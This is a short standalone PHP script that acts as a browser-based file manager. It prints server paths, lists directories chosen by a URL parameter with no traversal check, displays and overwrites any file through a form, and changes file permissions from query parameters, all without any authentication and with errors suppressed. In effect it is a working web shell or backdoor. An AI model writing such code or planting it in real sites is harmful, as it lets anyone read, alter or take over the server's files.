<?php

@$fn=$_GET['f'];

print "GLOBALS['SERVER_NAME']: ".$_SERVER["SERVER_NAME"]."<br>";
print "SERVER['DOCUMENT_ROOT']: ".$_SERVER["DOCUMENT_ROOT"]."<br>";
print "SERVER['SCRIPT_NAME']: ".$_SERVER["SCRIPT_NAME"]."<br>";
print "SERVER['SCRIPT_FILENAME']: ".$_SERVER["SCRIPT_FILENAME"]."<br>";
print "<hr>";

@$dd=$_GET['dd'];

$directoryName=$_SERVER["DOCUMENT_ROOT"]."".$dd;
$dir = dir($directoryName);
while($fileName = $dir->read())
{
	$dirfilename = $directoryName."/".$fileName;
	if ($fileName == " ")
	{
		$dirfilename = "";
	}
#	if ($fileName != "." && $fileName != "..")
#	{
		$fa[] = $dirfilename;
#		print $dirfilename."<br>";
#	}
}
$dir->close();

print "<table border=1><tr><td>file</td><td>edit?</td><td>size</td></tr>";

sort($fa);
reset($fa);
for($i=0;$i<count($fa);$i++)
{
	$fa[$i]=str_replace("//","/",$fa[$i]);
	$do_f="";
	if(is_file($fa[$i]))
	{
		$do_f="<a href=http://".$_SERVER["SERVER_NAME"]."".$_SERVER["SCRIPT_NAME"]."?dd=$dd&f=".str_replace($_SERVER["DOCUMENT_ROOT"]."/","",$fa[$i]).">".str_replace($directoryName."","",$fa[$i]);
		$tbl_str="<td>".$fa[$i]."</td><td>".$do_f."</a></td><td>".filesize($fa[$i])."</td>";
	}
	if(is_dir($fa[$i]))
	{
		$do_f="<a href=http://".$_SERVER["SERVER_NAME"]."".$_SERVER["SCRIPT_NAME"]."?dd=".str_replace($_SERVER["DOCUMENT_ROOT"]."","",$fa[$i])."><b>".str_replace($directoryName."","",$fa[$i])."</b>";
		$tbl_str="<td>".$fa[$i]."</td><td>".$do_f."</a></td><td>&nbsp;</td>";
	}
	print "<tr>".$tbl_str."</tr>";
}

print "</table>";

print "<hr>";

if(@is_file($fn))
{

	if(isset($_POST['pagedata']))
	{
		$fd = @fopen($fn,"w");
		$wrdata=$_POST['pagedata'];
		$wrdata_tmp=html_entity_decode($wrdata);
		$tmp1=@fwrite($fd,stripslashes($wrdata_tmp));
		$tmp2=@fclose($fd);
	}
	$fs=@filesize($fn);
	print "$fn: $fs byres<hr>";
#	$b1=@readfile($fn);
#	$rb1=htmlspecialchars($b1);

	$fd = @fopen($fn,"r");
	$b1=@fread($fd,filesize($fn));
	$rb1=htmlspecialchars($b1);
	$t1=@fclose($fd);

	print "<p align=center>";
	print "<form method=post action=\"\">";
	print "<textarea name=\"pagedata\" cols=100 rows=100>";
	echo($rb1);
	print "</textarea><br>";
	print "<input type=Submit name=savepage value=Save>";
	print "</form><br><hr>";

}
else
	print "This file was not found.";

if(isset($_GET['d1']))
{
	$rb2=$_GET['d1'];
	$rb3=$_GET['d2'];
	if(chmod("$rb2",$rb3)) print "dir attr ch ok"; else print "dir attr ch err";
}

?>

